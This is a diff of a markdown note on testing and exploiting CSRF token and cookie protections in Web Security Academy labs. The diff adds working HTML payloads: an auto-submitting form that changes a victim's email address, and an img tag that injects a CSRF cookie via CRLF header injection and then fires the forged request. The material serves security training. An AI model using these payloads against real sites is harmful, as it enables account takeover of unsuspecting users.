@@ -39,7 +39,9 @@ When testing a CSRF token, follow these steps:
 
 ## Testing CSRF Token and CSRF Cookies
 
-### Check if CSRF Token is Tied to the CSRF Cookie + Not Tied With User Session Cookie
+### Check if CSRF Token is Tied to the CSRF Cookie
+
+If CSRF cookie Not Tied With User Session Cookie
 
 1. **Submit an invalid CSRF token**: See if the application accepts it.
 2. **Submit a valid CSRF token from another user**: Check if the token is user-specific. 
@@ -48,8 +50,7 @@ When testing a CSRF token, follow these steps:
 
 ### Check if CSRF Token is Tied to the CSRF Cookie + Tied With User Session Cookie
 
-
-1.  Try to add the session cookie.
+If CSRF cookie Tied With User Session Cookie
 
 <br>
 
@@ -57,7 +58,7 @@ When testing a CSRF token, follow these steps:
 
 ---
 
-## Exploitation Techniques
+### Exploitation Techniques
 
 To exploit a CSRF token + cookie mechanism, two actions are required:
 
@@ -67,9 +68,10 @@ To exploit a CSRF token + cookie mechanism, two actions are required:
 ### HTML Exploit Example
 
 ```html
-<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
-    <input type="hidden" name="email" value="anything%40web-security-academy.net">
-</form>
+<form action="https://0ac3007703f51dc881598ea300940055.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="hacked&#64;a&#46;com" />
+      <input type="submit" value="Submit request" />
+    </form>
 <script>
         document.forms[0].submit();
 </script>
@@ -78,6 +80,10 @@ To exploit a CSRF token + cookie mechanism, two actions are required:
 ### Image-based CSRF Cookie Injection
 
 ```html
+<form action="https://0ac3007703f51dc881598ea300940055.web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="hacked&#64;a&#46;com" />
+      <input type="submit" value="Submit request" />
+    </form>
 <img src="https://0a5000e9036c9fa3820d15c300a500d4.web-security-academy.net/?search=asdasfa%0d%0aSet-Cookie:%20csrf=testing;%20SameSite=None" onerror="document.forms[0].submit()">
 ```
 
